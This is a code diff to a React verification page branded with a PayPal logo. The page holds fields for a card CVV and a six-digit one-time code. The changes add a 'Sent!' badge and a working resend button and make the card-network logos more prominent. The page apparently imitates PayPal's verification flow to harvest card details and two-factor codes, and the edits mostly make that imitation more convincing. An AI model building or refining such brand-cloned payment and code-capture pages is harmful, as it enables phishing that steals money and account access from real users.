@@ -21,6 +21,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   const [cvv, setCvv] = useState('');
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
   const [countdown, setCountdown] = useState(45);
+  const [showSentBadge, setShowSentBadge] = useState(false);
 
   useEffect(() => {
     let timer: NodeJS.Timeout;
@@ -80,6 +81,8 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
       } else if (selectedOption === 'get_text' || selectedOption === 'have_call' || selectedOption === 'get_email') {
         setStep('enter_code');
         setCountdown(45);
+        setShowSentBadge(true);
+        setTimeout(() => setShowSentBadge(false), 3000);
       }
     }, 800);
   };
@@ -122,17 +125,13 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
       <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleConfirm} className="w-full flex flex-col items-center">
-            {/* PayPal Logo and Card Type Logos */}
+            {/* Card Type Logos */}
             <div className="mb-8 self-start flex items-center gap-4">
-              <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
-                <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
-                <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
-              </svg>
-              <div className="flex gap-2">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4 w-auto grayscale opacity-40" />
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-4 w-auto grayscale opacity-40" />
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" className="h-4 w-auto grayscale opacity-40" />
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-4 w-auto grayscale opacity-40" />
+              <div className="flex gap-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" alt="Visa" className="h-6 w-auto" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-6 w-auto" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/American_Express_logo_%282018%29.svg" alt="Amex" className="h-6 w-auto" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-6 w-auto" />
               </div>
             </div>
             
@@ -190,6 +189,18 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   if (step === 'enter_code') {
     return (
       <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
+        {showSentBadge && (
+          <div className="fixed top-8 left-1/2 z-[110] animate-slide-down">
+            <div className="bg-[#007067] text-white px-6 py-3 rounded-xl flex items-center gap-2 shadow-lg">
+              <div className="w-5 h-5 rounded-full border-2 border-white flex items-center justify-center">
+                <svg viewBox="0 0 24 24" className="w-3 h-3 text-white" fill="none" stroke="currentColor" strokeWidth="4">
+                  <path d="M5 13l4 4L19 7" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
+              </div>
+              <span className="font-bold text-[15px]">Sent!</span>
+            </div>
+          </div>
+        )}
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleCodeSubmit} className="w-full flex flex-col items-center">
             {/* PayPal Logo */}
@@ -236,9 +247,19 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                 />
               ))}
             </div>
-            <p className="text-[14px] text-gray-600 mb-8 self-start">
+            <button
+              type="button"
+              onClick={() => {
+                if (countdown === 0) {
+                  setCountdown(45);
+                  setShowSentBadge(true);
+                  setTimeout(() => setShowSentBadge(false), 3000);
+                }
+              }}
+              className={`text-[14px] mb-8 self-start ${countdown > 0 ? 'text-gray-600 cursor-default' : 'text-[#0070BA] hover:underline cursor-pointer'}`}
+            >
               {countdown > 0 ? `Resend code in ${countdown} sec` : 'Resend code'}
-            </p>
+            </button>
             <button 
               type="submit"
               disabled={verificationCode.join('').length !== 6}
